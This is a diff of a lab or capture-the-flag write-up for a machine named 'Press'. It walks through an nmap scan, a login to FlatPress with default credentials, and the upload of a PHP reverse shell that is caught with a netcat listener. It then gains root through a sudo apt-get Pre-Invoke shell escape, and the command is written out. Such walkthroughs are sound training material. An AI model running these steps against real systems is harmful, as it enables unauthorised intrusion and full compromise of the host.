@@ -3,7 +3,7 @@
 # 🐧Press🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.247.29
 
 PORT     STATE SERVICE VERSION
@@ -16,11 +16,11 @@ port 80 is a rabbit hole
 port 8089 is running a flatpress web    
 use default credential admin password logged in successfully        
 search github and found we can upload a php revershell      
-```
+```console
 https://github.com/flatpressblog/flatpress/issues/152
 ```
 upload and execute the php file
-```
+```console
 $ nc -lvnp 80               
 listening on [any] 80 ...
 
@@ -31,7 +31,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## Privilege Escalation
 
 sudo -l and found we can run root with command apt-get
-```
+```console
 www-data@debian:/home$ sudo -l
 Matching Defaults entries for www-data on debian:
     env_reset, mail_badpass,
@@ -42,10 +42,10 @@ User www-data may run the following commands on debian:
 ```
 search GTFOBin and found a way to get root shell  
 https://gtfobins.org/gtfobins/apt-get/#shell    
-```
+```console
 apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
-```
+```console
 www-data@debian:/tmp$sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 # id
 uid=0(root) gid=0(root) groups=0(root)
